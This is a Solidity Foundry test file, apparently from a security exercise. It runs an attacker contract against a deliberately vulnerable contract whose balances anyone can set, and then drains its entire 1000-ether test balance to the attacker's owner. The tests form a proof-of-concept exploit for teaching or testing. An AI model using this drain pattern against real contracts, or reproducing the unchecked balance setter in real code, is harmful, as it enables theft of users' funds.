// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SafeContract.sol";
import "../src/Attacker.sol";

contract TestingDaAttack is Test {
    SafeContract notSoSafe;
    Attacker attacker;
    address attackerOwner;

    function setUp() public {
        notSoSafe = new SafeContract();
        
        vm.deal(address(notSoSafe), 1000 ether);
        
        // Deploy the attacker contract and store the owner's address
        attacker = new Attacker(address(notSoSafe));
        attackerOwner = address(this);
        
        // Reset funds for the attacker contract and its owner
        vm.deal(address(attacker), 0 ether);
        vm.deal(attackerOwner, 0 ether);
    }

    function testAttack() public {
        // The attacker tries to set their own balance arbitrarily
        attacker.attack(attackerOwner, 5.1 ether);

        // Verify that the attacker owner's balance in the vulnerable contract has been set to 5.1 ether
        uint256 attackerBalance = notSoSafe.getBalance(attackerOwner);
        assertEq(attackerBalance, 5.1 ether, "Attack failed: Balance did not update correctly");
    }

    function testWithdrawAndTransfer() public {
        // Get the total balance available in the vulnerable contract
        uint256 totalNotSoSafeBalance = address(notSoSafe).balance;

        require(totalNotSoSafeBalance > 0, "No funds in the vulnerable contract");

        // Set the initial balance for the attacker contract in the vulnerable contract
        attacker.attack(address(attacker), totalNotSoSafeBalance);

        // Verify that the attacker contract's balance in the vulnerable contract is equal to the total balance
        uint256 attackerBalanceBefore = notSoSafe.getBalance(address(attacker));
        assertEq(attackerBalanceBefore, totalNotSoSafeBalance, "Balance before withdraw incorrect");

        // Capture the initial balance of the attacker contract's owner
        uint256 ownerBalanceBefore = attackerOwner.balance;

        // Execute the withdrawal of the total balance from the vulnerable contract
        attacker.withdrawFromNotSoSafe(totalNotSoSafeBalance);

        // Verify that the attacker contract's balance in the vulnerable contract is now 0
        uint256 attackerBalanceAfter = notSoSafe.getBalance(address(attacker));
        assertEq(attackerBalanceAfter, 0, "Withdraw failed: Balance not zero");

        // Verify that the attacker contract received the withdrawn funds
        uint256 attackerContractBalance = address(attacker).balance;
        assertEq(attackerContractBalance, totalNotSoSafeBalance, "Withdraw failed: Contract balance incorrect");

        // Transfer funds to the attacker contract's owner
        attacker.transferToOwner();

        // Verify that the owner's balance has increased correctly
        uint256 ownerBalanceAfter = attackerOwner.balance;
        uint256 expectedOwnerBalance = ownerBalanceBefore + totalNotSoSafeBalance;
        assertEq(ownerBalanceAfter, expectedOwnerBalance, "Transfer to owner failed");
    }

    function testSingleTransaction() public {
        // Capture the initial balance of the attacker contract's owner
        uint256 ownerBalanceBefore = attackerOwner.balance;

        // Increase the attacker contract's balance in the vulnerable contract
        attacker.attack(address(attacker), 99 ether);

        // Execute attack, withdraw 99 ether, and transfer in a single transaction
        attacker.attackAndTransfer(address(attacker), 99 ether, 99 ether);

        // Verify that the balance of the attacker contract is 0 after the attack
        uint256 attackerBalanceAfterAttack = notSoSafe.getBalance(address(attacker));
        assertEq(attackerBalanceAfterAttack, 0, "Balance not zero after attack");

        // Verify that the funds have been transferred to the attacker contract's owner
        uint256 ownerBalanceAfter = attackerOwner.balance;
        uint256 expectedOwnerBalance = ownerBalanceBefore + 99 ether;
        assertEq(ownerBalanceAfter, expectedOwnerBalance, "Transfer to owner failed after attack");
    }

    receive() external payable {}
}